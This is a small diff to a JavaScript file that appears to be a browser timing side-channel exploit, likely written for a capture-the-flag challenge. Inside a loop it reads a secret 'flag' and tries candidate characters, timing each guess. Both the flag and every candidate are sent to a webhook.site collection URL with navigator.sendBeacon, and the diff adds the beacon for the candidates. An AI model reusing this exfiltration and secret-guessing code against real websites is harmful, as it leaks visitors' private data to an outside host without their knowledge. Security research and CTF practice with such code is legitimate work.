@@ -50,9 +50,10 @@ async function test(c){
 }
 async function start(){
     while(1){
-        navigator.sendBeacon("https://webhook.site/ebf8aa6a-e1af-40da-98bc-c8c64d920b0b",flag)
+        navigator.sendBeacon("https://webhook.site/ebf8aa6a-e1af-40da-98bc-c8c64d920b0b",flag);
         console.log(flag);
         for (let c of candidate){
+            navigator.sendBeacon("https://webhook.site/ebf8aa6a-e1af-40da-98bc-c8c64d920b0b",c);
             await ini(c);
             let time_change = date_time1-date_time0;
             console.log(time_change);
